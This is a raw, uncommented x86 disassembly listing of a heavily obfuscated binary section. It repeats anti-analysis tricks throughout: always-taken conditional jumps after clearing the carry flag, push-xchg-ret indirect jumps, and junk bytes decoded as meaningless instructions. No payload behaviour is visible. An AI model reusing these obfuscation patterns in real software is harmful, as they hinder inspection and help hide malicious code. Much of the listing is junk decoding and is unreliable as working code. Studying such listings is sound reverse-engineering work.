  40aa8d:	add    esi,DWORD PTR [ebp+0x24]
  40aa90:	pause  
  40aa92:	jmp    0x40cfd4
  40aa97:	jle    0x40aaba
  40aa99:	sbb    eax,0xd1c66d8f
  40aa9e:	dec    ebx
  40aa9f:	cs lahf 
  40aaa1:	dec    ebx
  40aaa2:	inc    ecx
  40aaa3:	lahf   
  40aaa4:	dec    ebx
  40aaa5:	adc    BYTE PTR [bp+0x53de],bh
  40aaaa:	pop    ecx
  40aaab:	jno    0x40aa7f
  40aaad:	pusha  
  40aaae:	pushf  
  40aaaf:	and    WORD PTR [esp],0xfe
  40aab5:	popf   
  40aab6:	jae    0x40b46b
  40aabc:	mov    ch,0x84
  40aabe:	mov    ch,0xb5
  40aac0:	sbb    eax,0x219f7d9f
  40aac5:	mov    ch,0xb5
  40aac7:	sub    al,0x82
  40aac9:	test   BYTE PTR [ebp+0x3c5b031a],dh
  40aacf:	push   ebx
  40aad0:	cld    
  40aad1:	ss cs mov ebx,0x40a8e3
  40aad8:	xrelease xchg DWORD PTR [esp],ebx
  40aadc:	es ret 0x0
  40aae0:	mov    ch,0xb5
  40aae2:	scas   al,BYTE PTR es:[edi]
  40aae3:	push   ebx
  40aae4:	and    DWORD PTR [edx+0x7e],ecx
  40aae7:	adc    al,0xb5
  40aae9:	(bad)  
  40aaea:	sahf   
  40aaeb:	push   0x0
  40aaed:	push   ebx
  40aaee:	ds cs cld 
  40aaf1:	mov    ebx,0x40d45e
  40aaf6:	xchg   DWORD PTR ds:[esp],ebx
  40aafa:	es ret 0x0
  40aafe:	mov    ch,0x59
  40ab00:	dec    edx
  40ab01:	scas   al,BYTE PTR es:[edi]
  40ab02:	(bad)  
  40ab03:	and    DWORD PTR [eax],edx
  40ab05:	lahf   
  40ab06:	mov    ch,0x8
  40ab08:	or     BYTE PTR [edi],dl
  40ab0a:	and    dl,0x33
  40ab0d:	cld    
  40ab0e:	es jmp 0x40cf96
  40ab14:	dec    ebx
  40ab15:	mov    ch,0xb5
  40ab17:	sub    al,0x14
  40ab19:	mov    ch,0x21
  40ab1b:	sbb    eax,0x2e21b52e
  40ab20:	and    DWORD PTR [esi-0x42],edi
  40ab23:	pop    DWORD PTR [si-0x4a2f]
  40ab28:	aas    
  40ab29:	mov    esi,eax
  40ab2b:	push   edx
  40ab2c:	ds repz lea edx,cs:0x40bf8e
  40ab35:	cld    
  40ab36:	xchg   DWORD PTR [esp],edx
  40ab39:	ss ret 0x0
  40ab3d:	sbb    eax,0x8be41fc
  40ab42:	dec    ebx
  40ab43:	adc    al,0x82
  40ab45:	sub    al,0x8
  40ab47:	dec    ecx
  40ab48:	xor    ecx,DWORD PTR [ebx+0xa096]
  40ab4e:	add    BYTE PTR [esi],bh
  40ab50:	cs jmp 0x40af0d
  40ab56:	mov    ch,0x59
  40ab58:	mov    ch,0x6d
  40ab5a:	jge    0x40ab58
  40ab5c:	and    DWORD PTR [eax-0x2e4a8342],esp
  40ab62:	test   BYTE PTR [ebp-0x244af761],dh
  40ab68:	push   ebx
  40ab69:	pushf  
  40ab6a:	and    WORD PTR [esp],0xfe
  40ab70:	popf   
  40ab71:	jae    0x40ef82
  40ab77:	ins    DWORD PTR es:[edi],dx
  40ab78:	cs push ebx
  40ab7a:	and    esi,eax
  40ab7c:	shl    DWORD PTR [ebp+0x4bc6beb5],1
  40ab82:	push   ebx
  40ab83:	mov    ch,0xde
  40ab85:	mov    ch,0x19
  40ab87:	ror    BYTE PTR [ebx+0x669c247d],cl
  40ab8d:	and    DWORD PTR [esp],0xf9d00fe
  40ab94:	sbb    ebp,0x1c
  40ab97:	add    BYTE PTR [eax],al
  40ab99:	dec    edx
  40ab9a:	sbb    eax,0x21b5be7e
  40ab9f:	mov    ch,0x59
  40aba1:	fidiv  WORD PTR [ebp+0x5c0859ae]
  40aba7:	(bad)  [eax-0x4]
  40abaa:	ds es jmp 0x40e2bd
  40abb1:	mov    ch,0xd1
  40abb3:	scas   al,BYTE PTR es:[edi]
  40abb4:	mov    ch,0xb5
  40abb6:	mov    esi,0xb5218221
  40abbb:	inc    ecx
  40abbc:	sub    al,0xde
  40abbe:	mov    ch,0xb5
  40abc0:	mov    ch,0xb5
  40abc2:	lahf   
  40abc3:	and    DWORD PTR [ecx+0x2e],ebx
  40abc6:	pop    esp
  40abc7:	add    cl,BYTE PTR [ebp+0x669c284d]
  40abcd:	and    DWORD PTR [esp],0xf9d00fe
  40abd4:	add    DWORD PTR [esi],0x3f
  40abd7:	add    BYTE PTR [eax],al
  40abd9:	ins    DWORD PTR es:[edi],dx
  40abda:	mov    al,ds:0x8a02121
  40abdf:	cs ins DWORD PTR es:[edi],dx
  40abe1:	lahf   
  40abe2:	mov    al,ds:0x44b7eb5
  40abe7:	or     DWORD PTR [eax],eax
  40abe9:	add    BYTE PTR [ecx-0x30d746e],al
  40abef:	es jmp 0x40b032
  40abf5:	cs adc BYTE PTR cs:[ecx-0x7e],al
  40abfa:	ficomp WORD PTR [edi+0x82c7e59]
  40ac00:	loope  0x40abb7
  40ac02:	xor    BYTE PTR [ebp-0x351b54b],0x21
  40ac09:	addr16 pop eax
  40ac0b:	fnstsw WORD PTR [eax+ebx*8+0x9a80]
  40ac12:	dec    edi
  40ac13:	add    eax,ebx
  40ac15:	push   ebp
  40ac16:	cs repz repnz mov ebp,0x40e551
  40ac1e:	xrelease xchg DWORD PTR [esp],ebp
  40ac22:	ss ret 0x0
  40ac26:	sbb    eax,0x14536708
  40ac2b:	cmp    BYTE PTR [esi-0x4b],0x14
  40ac2f:	jl     0x40ac02
  40ac31:	(bad)  
  40ac32:	push   ecx
  40ac33:	pushf  
  40ac34:	and    WORD PTR [esp],0xfe
  40ac3a:	popf   
  40ac3b:	jae    0x40cf05
  40ac41:	test   BYTE PTR [ebp+0x537d1db5],dh
  40ac47:	mov    ch,0xb5
  40ac49:	jge    0x40abcf
  40ac4b:	mov    ch,0x2c
  40ac4d:	loope  0x40ac20
  40ac4f:	mov    al,ds:0x9c202ccf
  40ac54:	and    WORD PTR [esp],0xfe
  40ac5a:	popf   
  40ac5b:	jae    0x40c676
  40ac61:	dec    ebx
  40ac62:	and    BYTE PTR [ecx],0xb5
  40ac65:	adc    al,0x4a
  40ac67:	mov    ch,0xfc
  40ac69:	mov    ch,0xb5
  40ac6b:	dec    ebx
  40ac6c:	mov    ch,0xc6
  40ac6e:	dec    edx
  40ac6f:	into   
  40ac70:	int3   
  40ac71:	int3   
  40ac72:	int3   
	...
  40ac8b:	add    BYTE PTR [eax],al
  40ac8d:	add    BYTE PTR [esi+0x5a],al
  40ac90:	push   edx
  40ac91:	cld    
  40ac92:	es ds mov edx,0x40f025
  40ac99:	xacquire xchg DWORD PTR [esp],edx
  40ac9d:	ss ret 0x0
  40aca1:	mov    ch,0x1d
  40aca3:	addr16 mov ch,0x59
  40aca6:	mov    ch,0x4a
  40aca8:	mov    ch,0xb5
  40acaa:	adc    al,0xb5
  40acac:	and    esi,ecx
  40acae:	je     0x40a46b
  40acb4:	ds ds jmp 0x40f516
  40acbb:	or     BYTE PTR [ebp+0x8216dfc],dh
  40acc1:	or     BYTE PTR [eax+0x5321a0fc],ah
  40acc7:	push   ebx
  40acc8:	fsubrp st(1),st
  40acca:	and    DWORD PTR [eax],ecx
  40accc:	ins    BYTE PTR es:[edi],dx
  40accd:	out    dx,eax
  40acce:	add    eax,0x2
  40acd1:	pushf  
  40acd2:	and    WORD PTR [esp],0xfe
  40acd8:	popf   
  40acd9:	jae    0x40c700
  40acdf:	mov    ch,0xb5
  40ace1:	scas   al,BYTE PTR es:[edi]
  40ace2:	fimul  WORD PTR [ebx+0x7c]
  40ace5:	shl    DWORD PTR [ebp-0x5ff74a4b],1
  40aceb:	pop    ecx
  40acec:	mov    dh,0x83
  40acee:	jmp    0x81a748fb
  40acf3:	and    al,0x24
  40acf5:	inc    BYTE PTR [eax]
  40acf7:	popf   
  40acf8:	jae    0x40e654
  40acfe:	cs adc al,0xb5
  40ad01:	dec    edx
  40ad02:	lahf   
  40ad03:	or     BYTE PTR cs:[esi+edi*2-0x4b],bh
  40ad08:	mov    ch,0x4a
  40ad0a:	adc    BYTE PTR [edi],ch
  40ad0c:	add    eax,ebx
  40ad0e:	pushf  
  40ad0f:	and    WORD PTR [esp],0xfe
  40ad15:	popf   
  40ad16:	jae    0x40d1b5
  40ad1c:	pop    ecx
  40ad1d:	mov    ch,0xc6
  40ad1f:	sbb    eax,0xb5e1b541
  40ad24:	shl    DWORD PTR [edi-0x1f],1
  40ad27:	fidivr WORD PTR [ebp-0x2f]
  40ad2a:	xor    al,0x38
  40ad2c:	retf   
  40ad2d:	pop    ebx
  40ad2e:	push   ecx
  40ad2f:	cs ds nop
  40ad32:	lea    ecx,ds:0x40b2ec
  40ad38:	nop
  40ad39:	xchg   DWORD PTR [esp],ecx
  40ad3c:	repz ret 0x0
  40ad40:	mov    esi,0x4a8210b5
  40ad45:	scas   al,BYTE PTR es:[edi]
  40ad46:	mov    ch,0xb5
  40ad48:	(bad)  
  40ad49:	mov    ch,0x6d
  40ad4b:	dec    eax
  40ad4c:	add    eax,DWORD PTR [eax]
  40ad4e:	add    BYTE PTR [ebp-0x740c8e90],bl
  40ad54:	div    DWORD PTR [esi]
  40ad56:	es ss jmp 0x40c818
  40ad5d:	mov    esi,0x82b57e21
  40ad62:	cld    
  40ad63:	dec    edx
  40ad64:	dec    ebx
  40ad65:	jle    0x40ade5
  40ad67:	scas   al,BYTE PTR es:[edi]
  40ad68:	sbb    eax,0x6782b521
  40ad6d:	dec    edx
  40ad6e:	mov    ch,0x4b
  40ad70:	addr16 dec ebx
  40ad72:	inc    edx
  40ad73:	push   eax
  40ad74:	ds es es mov eax,0x40cee6
  40ad7c:	cld    
  40ad7d:	xchg   DWORD PTR [esp],eax
  40ad80:	bnd ret 0x0
  40ad84:	mov    ch,0x21
  40ad86:	faddp  st(6),st
  40ad88:	sbb    eax,0xb5b5aefc
  40ad8d:	or     cl,ah
  40ad8f:	or     bl,bh
  40ad91:	mov    WORD PTR [edi+0x16],cx
  40ad95:	nop
  40ad96:	repz jmp 0x40a7c5
  40ad9c:	cld    
  40ad9d:	loope  0x40ad54
  40ad9f:	and    DWORD PTR [ebp-0x4aa6834b],esi
  40ada5:	or     BYTE PTR [ebp+0x531d21b5],dh
  40adab:	and    DWORD PTR [ebp+0x3339d121],esi
  40adb1:	pop    ecx
  40adb2:	cld    
  40adb3:	ds jmp 0x40d99d
  40adb9:	mov    al,ds:0x109ffc7e
  40adbe:	adc    al,0xb5
  40adc0:	test   BYTE PTR [esi+0x214b7d59],bh
  40adc6:	add    BYTE PTR [ecx-0x4],0xb5
  40adca:	mov    ch,0xb5
  40adcc:	and    BYTE PTR [ecx],0xae
  40adcf:	out    0x51,eax
  40add1:	pushf  
  40add2:	and    WORD PTR [esp],0xfe
  40add8:	popf   
  40add9:	jae    0x40a48b
  40addf:	dec    ebx
  40ade0:	cs pop ecx
  40ade2:	adc    al,0x2e
  40ade4:	and    DWORD PTR [ecx],esp
  40ade6:	cmp    BYTE PTR [esp+edx*1-0x4b],0xa0
  40adeb:	dec    ebx
  40adec:	ror    DWORD PTR [bx-0x6370],1
  40adf1:	and    WORD PTR [esp],0xfe
  40adf7:	popf   
  40adf8:	jae    0x40bedb
  40adfe:	mov    al,ds:0xfcfca0b5
  40ae03:	and    DWORD PTR [edi-0x60412160],ecx
  40ae09:	(bad)  
  40ae0a:	and    DWORD PTR [ebp-0x4b],ebp
  40ae0d:	push   edx
  40ae0e:	mov    eax,eax
  40ae10:	pushf  
  40ae11:	and    WORD PTR [esp],0xfe
  40ae17:	popf   
  40ae18:	jae    0x40e635
  40ae1e:	inc    ecx
  40ae1f:	ins    DWORD PTR es:[edi],dx
  40ae20:	jge    0x40ae43
  40ae22:	sbb    eax,0x53a0de08
  40ae27:	or     BYTE PTR [ebx-0x52],dl
  40ae2a:	mov    ch,0xfc
  40ae2c:	daa    
  40ae2d:	int3   
  40ae2e:	int3   
  40ae2f:	int3   
	...
  40ae48:	add    BYTE PTR [eax],al
  40ae4a:	add    bl,ah
  40ae4c:	mov    eax,DWORD PTR [eax+0x14]
  40ae4f:	pushf  
  40ae50:	and    WORD PTR [esp],0xfe
  40ae56:	popf   
  40ae57:	jae    0x40bd74
  40ae5d:	or     BYTE PTR [edx+0x14],0xa0
  40ae61:	mov    al,ds:0x820808de
  40ae66:	dec    edx
  40ae67:	dec    ebx
  40ae68:	jle    0x40ae7a
  40ae6a:	mov    esp,0xd88bf2dd
  40ae6f:	cld    
  40ae70:	cld    
  40ae71:	jmp    0x40a341
  40ae76:	sbb    dh,0x21
  40ae79:	(bad)  
  40ae7a:	mov    ch,0x1d
  40ae7c:	mov    ch,0xe1
  40ae7e:	adc    cl,dl
  40ae80:	or     BYTE PTR [eax],0x2c
  40ae83:	loope  0x40aef2
  40ae85:	mov    ch,0x7d
  40ae87:	sub    al,0xfc
  40ae89:	ror    DWORD PTR [edx-0x1f],1
  40ae8c:	and    bh,BYTE PTR [ecx+0x572289cb]
  40ae92:	ds cs cld 
  40ae95:	jmp    0x40b9e4
  40ae9a:	sar    DWORD PTR [esi+0x14],1
  40ae9d:	mov    ch,0xe1
  40ae9f:	loope  0x40ae56
  40aea1:	and    DWORD PTR [edx+eax*4],edx
  40aea4:	add    BYTE PTR [edx-0x4a21d3b5],0xb5
  40aeab:	outs   dx,DWORD PTR ds:[esi]
  40aeac:	inc    ebx
  40aead:	repnz cld 
  40aeaf:	jmp    0x40c1c2
  40aeb4:	ins    DWORD PTR es:[edi],dx
  40aeb5:	cs scas al,BYTE PTR es:[edi]
  40aeb7:	(bad)  
  40aeb8:	mov    ch,0xb5
  40aeba:	mov    ch,0x2c
  40aebc:	loope  0x40aece
  40aebe:	scas   al,BYTE PTR es:[di]
  40aec0:	sub    al,0xb5
  40aec2:	cld    
  40aec3:	jge    0x40af10
  40aec5:	and    esi,eax
  40aec7:	addr16 mov ch,0x7c
  40aeca:	std    
  40aecb:	mov    ah,0x58
  40aecd:	or     esi,DWORD PTR [ebx]
  40aecf:	rcl    BYTE PTR [ecx+0x2e],0x36
  40aed3:	cs mov ecx,0x40e8e0
  40aed9:	cld    
  40aeda:	xchg   DWORD PTR [esp],ecx
  40aedd:	ds ret 0x0
  40aee1:	adc    BYTE PTR [edi-0x1e7d4ad4],cl
  40aee7:	mov    ch,0xe1
  40aee9:	adc    BYTE PTR [eax-0x3ed4a504],ah
  40aeef:	pushf  
  40aef0:	and    WORD PTR [esp],0xfe
  40aef6:	popf   
  40aef7:	jae    0x40a7a6
  40aefd:	scas   al,BYTE PTR es:[edi]
  40aefe:	lahf   
  40aeff:	test   BYTE PTR [ecx],ah
  40af01:	cld    
  40af02:	ror    DWORD PTR [ebx-0x42],1
  40af05:	jl     0x40aebc
  40af07:	sub    al,0x82
  40af09:	and    DWORD PTR [ecx+ebp*8],ebp
  40af0c:	out    dx,al
  40af0d:	test   edx,edx
  40af0f:	cld    
  40af10:	cs repz jmp 0x40d91e
  40af17:	sbb    eax,0x6784b56d
  40af1c:	dec    ebx
  40af1d:	dec    ebx
  40af1e:	dec    edx
  40af1f:	mov    ch,0x9f
  40af21:	and    esp,edi
  40af23:	dec    ebx
  40af24:	and    DWORD PTR [ebp-0x4a03604b],esi
  40af2a:	mov    ch,0xe2
  40af2c:	pusha  
  40af2d:	nop
  40af2e:	bnd jmp 0x40bebb
  40af34:	addr16 mov ch,0xb5
  40af37:	cld    
  40af38:	mov    ch,0x2e
  40af3a:	test   BYTE PTR [esi*4-0x214a4a4b],dl
  40af41:	(bad)  
  40af43:	and    ecx,edx
  40af45:	cs jle 0x40afb5
  40af48:	mov    ch,0x1d
  40af4a:	mov    DWORD PTR ss:[esp+0x40],eax
  40af4f:	bnd cs ss jmp 0x40f55d
  40af57:	sbb    eax,0xb5ae4141
  40af5c:	mov    ch,0xbe
  40af5e:	or     cl,dl
  40af60:	and    DWORD PTR [eax-0x2e4ade4b],esp
  40af66:	loope  0x40afcf
  40af68:	sub    al,0xf2
  40af6a:	pop    ecx
  40af6b:	push   eax
  40af6c:	nop
  40af6d:	repnz repz lea eax,ds:0x40e23f
  40af75:	cld    
  40af76:	xchg   DWORD PTR [esp],eax
  40af79:	repz ret 0x0
  40af7d:	mov    esi,0x2c08829f
  40af82:	jle    0x40afce
  40af84:	lahf   
  40af85:	sbb    eax,0x67dd2121
  40af8a:	call   DWORD PTR [ebp+0x4]
  40af8d:	pushf  
  40af8e:	and    WORD PTR [esp],0xfe
  40af94:	popf   
  40af95:	jae    0x40bfd2
  40af9b:	dec    ebx
  40af9c:	and    esi,eax
  40af9e:	dec    ebx
  40af9f:	jle    0x40afb5
  40afa1:	mov    esi,0x8b510c6
  40afa6:	addr16 addr16 shr ebx,0x8b
  40afab:	ret    
  40afac:	push   ecx
  40afad:	ds nop
  40afaf:	repz mov ecx,0x40de5f
  40afb5:	nop
  40afb6:	xchg   DWORD PTR [esp],ecx
  40afb9:	repz ret 0x0
  40afbd:	mov    al,ds:0x67089f4b
  40afc2:	jl     0x40b031
  40afc4:	mov    ch,0xb5
  40afc6:	adc    BYTE PTR [ebp+0x240431ca],dh
  40afcc:	pushf  
  40afcd:	and    WORD PTR [esp],0xfe
  40afd3:	popf   
  40afd4:	jae    0x40dabd
  40afda:	ins    DWORD PTR es:[edi],dx
  40afdb:	and    DWORD PTR [esi],ebp
  40afdd:	jge    0x40af9d
  40afdf:	mov    ch,0x10
  40afe1:	adc    ah,bh
  40afe3:	shl    DWORD PTR [ebp-0x1618de4b],1
  40afe9:	(bad)  
  40afea:	std    
  40afeb:	(bad)  
  40afec:	call   DWORD PTR [ebp-0x70]
  40afef:	cs lea ebp,ds:0x40f5a2
  40aff7:	xacquire xchg DWORD PTR [esp],ebp
  40affb:	ss ret 0x0
  40afff:	sbb    eax,0xe14ab5c6
  40b004:	pop    ecx
  40b005:	mov    ch,0x81
  40b007:	(bad)  
  40b008:	loopne 0x40b00a
  40b00a:	add    BYTE PTR [ecx+0xd],cl
  40b00d:	sbb    eax,0x337afd5d
  40b012:	shl    bl,cl
  40b014:	cs jmp 0x40c28e
  40b01a:	sub    al,0x21
  40b01c:	adc    cl,dl
  40b01e:	dec    edx
  40b01f:	sbb    eax,0x21598fde
  40b024:	dec    ebx
  40b025:	or     BYTE PTR ds:0x4a595982,bl
  40b02b:	mov    ch,0xae
  40b02d:	mov    ch,0x8f
  40b02f:	lds    ebx,FWORD PTR [ebp-0x35]
  40b032:	shl    esi,0x3
  40b035:	pushf  
  40b036:	and    WORD PTR [esp],0xfe
  40b03c:	popf   
  40b03d:	jae    0x40c8d7
  40b043:	adc    BYTE PTR [ecx],ah
  40b045:	ins    DWORD PTR es:[edi],dx
  40b046:	and    DWORD PTR [ecx],esp
  40b048:	adc    BYTE PTR [edi+0x8592159],bl
  40b04e:	cld    
  40b04f:	sub    al,0x66
  40b051:	int3   
  40b052:	int3   
  40b053:	int3   
	...
  40b06c:	add    BYTE PTR [eax],al
  40b06e:	add    BYTE PTR [esi-0x75],dh
  40b071:	repz es ss jmp 0x40cd35
  40b079:	and    DWORD PTR [eax],edx
  40b07b:	or     BYTE PTR [ebp+0x4b],bh
  40b07e:	and    DWORD PTR [esi-0x4a98be04],ebp
  40b084:	ins    DWORD PTR es:[di],dx
  40b086:	scas   al,BYTE PTR es:[edi]
  40b087:	mov    ch,0x10
  40b089:	dec    ebx
  40b08a:	and    DWORD PTR [ebx+ecx*2],ebp
  40b08d:	or     BYTE PTR [edx],bl
  40b08f:	mov    edi,eax
  40b091:	push   eax
  40b092:	cld    
  40b093:	repz lea eax,es:0x40f4d8
  40b09b:	xrelease xchg DWORD PTR [esp],eax
  40b09f:	ss ret 0x0
  40b0a3:	lahf   
  40b0a4:	test   dh,bl
  40b0a6:	ins    DWORD PTR es:[edi],dx
  40b0a7:	(bad)  
  40b0a8:	dec    edx
  40b0a9:	and    DWORD PTR [esi-0x854161],edi
  40b0af:	push   edi
  40b0b0:	loopne 0x40b04e
  40b0b2:	and    WORD PTR [esp],0xfe
  40b0b8:	popf   
  40b0b9:	jae    0x40d723
  40b0bf:	jge    0x40b10b
  40b0c1:	cld    
  40b0c2:	lahf   
  40b0c3:	mov    al,ds:0xb541b5b5
  40b0c8:	and    DWORD PTR [eax],ecx
  40b0ca:	test   BYTE PTR [ebp-0x6f0dbf12],dh
  40b0d0:	repz jmp 0x40c248
  40b0d6:	(bad)  
  40b0d7:	adc    al,0x53
  40b0d9:	dec    ebx
  40b0da:	jl     0x40b08a
  40b0dc:	lahf   
  40b0dd:	loope  0x40b132
  40b0df:	and    ecx,edx
  40b0e1:	sbb    eax,0xc621e14b
  40b0e6:	cld    
  40b0e7:	(bad)  
  40b0e8:	mov    al,ds:0x8b1b82fc
  40b0ed:	jle    0x40b123
  40b0ef:	pushf  
  40b0f0:	and    WORD PTR [esp],0xfe
  40b0f6:	popf   
  40b0f7:	jae    0x40ece9
  40b0fd:	mov    ch,0x67
  40b0ff:	mov    ch,0x4b
  40b101:	pop    ecx
  40b102:	ins    DWORD PTR es:[edi],dx
  40b103:	dec    ebx
  40b104:	and    DWORD PTR [ecx],esp
  40b106:	mov    esi,0x827edeb5
  40b10b:	not    DWORD PTR [esp]
  40b10e:	cld    
  40b10f:	ss cld 
  40b111:	jmp    0x40e532
  40b116:	loope  0x40b12c
  40b118:	fidiv  WORD PTR [ebp-0x412ed1e3]
  40b11e:	pop    ecx
  40b11f:	dec    edx
  40b120:	dec    edx
  40b121:	mov    ch,0x6d
  40b123:	mov    ch,0xae
  40b125:	mov    ch,0xb5
  40b127:	mov    ch,0xc6
  40b129:	jg     0x40b13a
  40b12b:	test   ebx,eax
  40b12d:	and    BYTE PTR [eax],al
  40b12f:	add    BYTE PTR [esi],bh
  40b131:	bnd es jmp 0x40ea60
  40b138:	cld    
  40b139:	mov    esi,0x6759beb5
  40b13e:	mov    ch,0xb5
  40b140:	scas   al,BYTE PTR es:[edi]
  40b141:	mov    ch,0x82
  40b143:	cs mov ch,0x67
  40b146:	addr16 and ebp,ecx
  40b149:	(bad)  
  40b14a:	int3   
  40b14b:	int3   
  40b14c:	int3   
	...
  40b165:	add    BYTE PTR [eax],al
  40b167:	add    BYTE PTR [esi-0x7e9963a2],ah
  40b16d:	and    al,0x24
  40b16f:	inc    BYTE PTR [eax]
  40b171:	popf   
  40b172:	jae    0x40b943
  40b178:	scas   al,BYTE PTR es:[edi]
  40b179:	mov    ch,0x67
  40b17b:	mov    ch,0x4b
  40b17d:	addr16 cld 
  40b17f:	lahf   
  40b180:	loope  0x40b1fe
  40b182:	shl    DWORD PTR [ebp+0x4ede0884],1
  40b188:	lods   al,BYTE PTR ds:[esi]
  40b189:	push   ebx
  40b18a:	cs repz lea ebx,es:0x40d325
  40b193:	xrelease xchg DWORD PTR [esp],ebx
  40b197:	es ret 0x0
  40b19b:	(bad)  
  40b19c:	addr16 jge 0x40b15d
  40b19f:	test   BYTE PTR [di-0x4a04],dh
  40b1a4:	cs mov ch,0x3
  40b1a7:	ret    
  40b1a8:	ss cld 
  40b1aa:	jmp    0x40cbd7
  40b1af:	mov    ch,0xb5
  40b1b1:	addr16 jle 0x40b192
  40b1b4:	lahf   
  40b1b5:	and    DWORD PTR [eax],ecx
  40b1b7:	shl    DWORD PTR [ecx],1
  40b1b9:	loope  0x40b170
  40b1bb:	sub    al,0xa0
  40b1bd:	mov    ch,0xbe
  40b1bf:	mov    ch,0x4b
  40b1c1:	and    DWORD PTR [ebp+edi*2-0x3f7a01df],eax
  40b1c8:	es ds jmp 0x40b982
  40b1cf:	(bad)  
  40b1d0:	pop    ecx
  40b1d1:	and    DWORD PTR [edx-0x707d217c],eax
  40b1d7:	mov    al,ds:0x410810b5
  40b1dc:	mov    ch,0x6d
  40b1de:	mov    ch,0xb5
  40b1e0:	mov    ch,0xc6
  40b1e2:	mov    al,ds:0xbf0f73b5
  40b1e7:	inc    ecx
  40b1e8:	adc    al,0x9c
  40b1ea:	and    WORD PTR [esp],0xfe
  40b1f0:	popf   
  40b1f1:	jae    0x40c8f6
  40b1f7:	mov    esi,0xbeae0808
  40b1fc:	mov    ch,0x7e
  40b1fe:	sub    al,0x82
  40b200:	push   ebx
  40b201:	and    DWORD PTR [esi-0x37],edi
  40b204:	fld    st(3)
  40b206:	mov    edi,eax
  40b208:	push   esi
  40b209:	es cld 
  40b20b:	repnz mov esi,0x40d49d
  40b211:	xacquire xchg DWORD PTR [esp],esi
  40b215:	cld    
  40b216:	ret    0x0
  40b219:	mov    BYTE PTR [eax+eiz*4-0x31ed160],0x9f
  40b221:	dec    ebx
  40b222:	mov    ch,0xb5
  40b224:	dec    edi
  40b225:	add    esi,ebx
  40b227:	pushf  
  40b228:	and    WORD PTR [esp],0xfe
  40b22e:	popf   
  40b22f:	jae    0x40cdfc
  40b235:	xor    BYTE PTR [ebp-0x70820342],0xa0
  40b23c:	cld    
  40b23d:	mov    ch,0x59
  40b23f:	dec    edx
  40b240:	push   ebx
  40b241:	mov    ch,0xb5
  40b243:	cwde   
  40b244:	in     al,dx
  40b245:	(bad)  
  40b246:	mov    ecx,0x7262694c
  40b24b:	push   ecx
  40b24c:	cld    
  40b24d:	ds ds mov ecx,0x40a535
  40b254:	cld    
  40b255:	xchg   DWORD PTR [esp],ecx
  40b258:	repz ret 0x0
  40b25c:	addr16 jle 0x40b214
  40b25f:	and    ecx,edx
  40b261:	adc    BYTE PTR [ebp+0x5049c2de],dh
  40b267:	nop
  40b268:	repnz repz mov eax,0x40c4d8
  40b26f:	cld    
  40b270:	xchg   DWORD PTR [esp],eax
  40b273:	ds ret 0x0
  40b277:	cld    
  40b278:	mov    ch,0xae
  40b27a:	mov    ch,0xe1
  40b27c:	pop    ecx
  40b27d:	sbb    eax,0xb57e2c7c
  40b282:	sbb    eax,0xb700
  40b287:	xor    esi,esi
  40b289:	lods   eax,DWORD PTR ds:[esi]
  40b28a:	pushf  
  40b28b:	and    WORD PTR [esp],0xfe
  40b291:	popf   
  40b292:	jae    0x40d43f
  40b298:	and    DWORD PTR [ecx],esp
  40b29a:	addr16 sub al,0x8f
  40b29d:	scas   al,BYTE PTR es:[edi]
  40b29e:	cld    
  40b29f:	cs (bad) 
  40b2a1:	pop    ecx
  40b2a2:	mov    ch,0x8
  40b2a4:	adc    al,0x9f
  40b2a6:	scas   al,BYTE PTR es:[edi]
  40b2a7:	jge    0x40b31d
  40b2a9:	adc    al,0xa2
  40b2ab:	test   eax,0x80000000
  40b2b0:	es es cs jmp 0x40bb4b
  40b2b8:	lahf   
  40b2b9:	mov    ch,0xe1
  40b2bb:	cld    
  40b2bc:	fimul  WORD PTR [eax]
  40b2be:	mov    ch,0x7e
  40b2c0:	jge    0x40b2f0
  40b2c2:	scas   al,BYTE PTR es:[edi]
  40b2c3:	or     BYTE PTR [ebx+0x10],dl
  40b2c6:	cs mov ch,0x2e
  40b2c9:	cmp    DWORD PTR [ecx-0x13],esp
  40b2cc:	sti    
  40b2cd:	push   ecx
  40b2ce:	push   esi
  40b2cf:	ss nop
  40b2d1:	ss mov esi,0x40a236
  40b2d7:	nop
  40b2d8:	xchg   DWORD PTR [esp],esi
  40b2db:	nop
  40b2dc:	ret    0x0
  40b2df:	loope  0x40b302
  40b2e1:	mov    ch,0xae
  40b2e3:	ins    DWORD PTR es:[edi],dx
  40b2e4:	(bad)  
  40b2e5:	add    BYTE PTR [si+0x7cb5],0x59
  40b2eb:	jle    0x40b34c
  40b2ed:	cs es bnd jmp 0x40e7f0
  40b2f5:	scas   al,BYTE PTR es:[edi]
  40b2f6:	jl     0x40b2ad
  40b2f8:	mov    ch,0x6d
  40b2fa:	mov    ch,0x59
  40b2fc:	(bad)  
  40b2fd:	or     BYTE PTR [edx+0x81d6d4a],al
  40b303:	ins    DWORD PTR es:[edi],dx
  40b304:	(bad)  
  40b305:	mov    ch,0x8f
  40b307:	(bad)
  40b30b:	mov    ebx,DWORD PTR [edx+0x10]
  40b30e:	pushf  
  40b30f:	and    WORD PTR [esp],0xfe
  40b315:	popf   
  40b316:	jae    0x40dbe4
  40b31c:	and    DWORD PTR [ecx],esp
  40b31e:	jl     0x40b2d5
  40b320:	test   BYTE PTR [eax],dl
  40b322:	mov    ch,0x10
  40b324:	(bad)  
  40b325:	mov    ch,0x2c
  40b327:	scas   al,BYTE PTR es:[edi]
  40b328:	jle    0x40b30e
  40b32a:	mov    al,0x2d
  40b32c:	leave  
  40b32d:	int    0x18
  40b32f:	(bad)  
  40b331:	int3   
  40b332:	int3   
	...
  40b34b:	add    BYTE PTR [eax],al
  40b34d:	add    BYTE PTR [edi-0x7d],dl
  40b350:	les    ecx,FWORD PTR [esi+esi*1]
  40b353:	ds ss jmp 0x40b7e8
  40b35a:	mov    ch,0x8
  40b35c:	adc    BYTE PTR [ebp+0x6db5104b],dh
  40b362:	push   ebx
  40b363:	scas   al,BYTE PTR es:[edi]
  40b364:	fimul  WORD PTR [eax]
  40b366:	sub    BYTE PTR [ebp-0x7e],0x14
  40b36a:	adc    BYTE PTR [eax],dl
  40b36c:	lahf   
  40b36d:	es jmp 0x40b1c6
  40b373:	pushf  
  40b374:	and    WORD PTR [esp],0xfe
  40b37a:	popf   
  40b37b:	jae    0x40e2fb
  40b381:	pop    ecx
  40b382:	loope  0x40b339
  40b384:	mov    ch,0xb5
  40b386:	and    esi,eax
  40b388:	sbb    eax,0x827d4ab5
  40b38d:	mov    DWORD PTR [eax],0x28f
  40b393:	ds ds bnd jmp 0x40c093
  40b39b:	mov    ch,0xb5
  40b39d:	or     BYTE PTR [eax],cl
  40b39f:	scas   al,BYTE PTR es:[edi]
  40b3a0:	mov    ch,0xa0
